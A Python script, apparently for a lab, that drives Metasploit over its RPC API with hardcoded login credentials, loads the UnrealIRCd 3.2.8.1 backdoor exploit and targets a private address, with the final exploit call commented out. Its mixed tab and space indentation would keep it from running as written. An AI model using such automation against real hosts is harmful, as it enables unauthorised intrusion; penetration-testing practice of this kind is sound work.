import msgpack, http.client, time, sys

target_host = "192.168.56.3"

class Msfrpc:
    def __init__(self,opts=[]):
        self.host = "127.0.0.1"
        self.port = 55552
        self.token = False
        self.auth = False
        self.client = http.client.HTTPConnection(self.host,self.port)
        self.console_id = ''

    def encode(self, data):
        return msgpack.packb(data)
    def decode(self,data):
        return msgpack.unpackb(data)

	def bytes_to_dict(self,bytes_dict):
	    out = {}
	    for attrib,value in bytes_dict.items():
	        if type(value) is not bytes:
	            out.update({attrib.decode('utf-8'):value})
	        else:
	            out.update({attrib.decode('utf-8'):value.decode('utf-8')})
	    return out

	def returnOne(self):
		return 1
 
    def call(self,meth,opts=[]):
        if self.console_id:
        	opts.insert(0,self.console_id)

        if meth != "auth.login":
            opts.insert(0,self.token)

        opts.insert(0,meth)
        params = self.encode(opts)
        self.client.request("POST","/api/",params,{"Content-type" : "binary/message-pack"})
        resp = self.client.getresponse()
        if meth == 'console.write':
        	c.wait()
        else:
        	return self.bytes_to_dict(self.decode(resp.read()))

    def wait(self):
    	res = c.call('console.read',[])
    	print(res)
    	if res['busy'] == False:
    		time.sleep(3)
    	while res['busy'] == True:
    		time.sleep(1)
    		res = c.call('console.read',[])
    	return res

if __name__ == '__main__':
	c = Msfrpc({})
	c.auth = c.call('auth.login',['msf','abc123'])
	print(c.auth)
	c.token = c.auth['token']
	c.console_id = c.call('console.create')['id']
	try:
		print(c.console_id)
		c.call('console.read',[])
		c.call('console.write',['search unreal_ircd_3281_backdoor\n'])
		exp_path = [line.split()[0] for line in c.wait()['data'].split('\n') if 'exploit' in line][0]
		c.call('console.write',['use '+exp_path+'\n'])
		c.call('console.write',['show options\n'])
		c.call('console.write',['set RHOST '+target_host+'\n'])
		#c.call('console.write',['exploit\n'])
		#c.call('console.destroy',[])
		print('done.')
	except Exception as e:
		print(e)
		c.call('console.destroy',[])
		exit(1)